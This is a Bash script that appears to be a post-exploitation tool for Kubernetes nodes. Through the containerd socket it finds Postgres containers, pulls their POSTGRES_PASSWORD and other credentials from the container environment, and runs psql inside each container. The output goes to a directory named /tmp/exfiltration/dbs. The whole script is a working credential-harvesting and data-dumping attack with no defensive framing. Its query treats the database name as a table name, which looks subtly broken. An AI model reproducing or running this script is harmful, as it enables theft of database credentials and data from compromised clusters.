#!/usr/bin/env bash
set -Eeuo pipefail

if [ -n "${1:-}" ]; then
  curl -L https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.30.0/crictl-v1.30.0-linux-amd64.tar.gz | tar zx -C /usr/local/bin
  cat >/etc/crictl.yaml <<'YAML'
runtime-endpoint: unix:///host/run/containerd/containerd.sock
image-endpoint: unix:///host/run/containerd/containerd.sock
timeout: 10
debug: false
YAML
fi

# Diagnosis: print line and command on every unmanaged error
trap 'echo "[ERR] (line $LINENO) command: $BASH_COMMAND" >&2' ERR

OUTDIR=/tmp/exfiltration/dbs
mkdir -p "$OUTDIR"

# Minimal verifications
command -v crictl >/dev/null 2>&1 || { echo "ERROR: crictl not found"; exit 1; }
command -v jq >/dev/null 2>&1 || { echo "ERRORE: jq not found"; exit 1; }

# --- POSTGRES IN CONTAINER ---
mapfile -t CIDS < <(crictl ps -q --name postgres)
if [[ ${#CIDS[@]} -eq 0 ]]; then
  echo "No containers with name including 'postgres' found"
  exit 0
fi

echo "Found ${#CIDS[@]} containers. Running query…"
for CID in "${CIDS[@]}"; do
  # Extract env and metadata from container (protected)
  if ! INSPECT_JSON=$(crictl inspect "$CID"); then
    echo "   [SKIP] inspect failed for $CID (container maybe terminated)" >&2
    continue
  fi

  # Converts array envs in objects key->value and takes the three variables
  read -r USER DB PASS < <(printf '%s' "$INSPECT_JSON" \
    | jq -r '
      .info.config.envs
      | (map({(.key): .value}) | add) as $e
      | "\($e.POSTGRES_USER) \($e.POSTGRES_DB) \($e.POSTGRES_PASSWORD)"
    ')

  # Metadata for filename
  NS=$(printf '%s' "$INSPECT_JSON" | jq -r '.status.labels["io.kubernetes.pod.namespace"] // "default"')
  POD=$(printf '%s' "$INSPECT_JSON" | jq -r '.status.labels["io.kubernetes.pod.name"] // "unknown-pod"')
  CNAME=$(printf '%s' "$INSPECT_JSON" | jq -r '.status.metadata.name // "container"')
  SHORTCID=${CID:0:12}

  SAFE_NS=${NS//\//_}
  SAFE_POD=${POD//\//_}
  SAFE_CNAME=${CNAME//\//_}
  OUTFILE="$OUTDIR/${SAFE_NS}-${SAFE_POD}-${SAFE_CNAME}-${SHORTCID}.txt"

  echo "-> $NS/$POD ($CNAME $SHORTCID)  user=$USER db=$DB  -> $OUTFILE"

  # Verification presence psql in container
  if ! crictl exec -i "$CID" sh -c 'command -v psql >/dev/null 2>&1 || command -v /usr/bin/psql >/dev/null 2>&1'; then
    echo "   [SKIP] psql not present in image ($CID)" >&2
    continue
  fi

  QUERY="SELECT * FROM $DB;"
  echo "$QUERY"

  # Run query
  if ! crictl exec -i "$CID" env PGPASSWORD="$PASS" \
       psql -h 127.0.0.1 -U "$USER" -d "$DB" -t -A -c "$QUERY" >"$OUTFILE" 2>"$OUTFILE.err"; then
    echo "   [ERR] query failed. See $OUTFILE.err" >&2
    continue
  fi

  echo "Remove err file"
  [[ -s "$OUTFILE.err" ]] || rm -f "$OUTFILE.err"
done

echo "Done. Output in: $OUTDIR"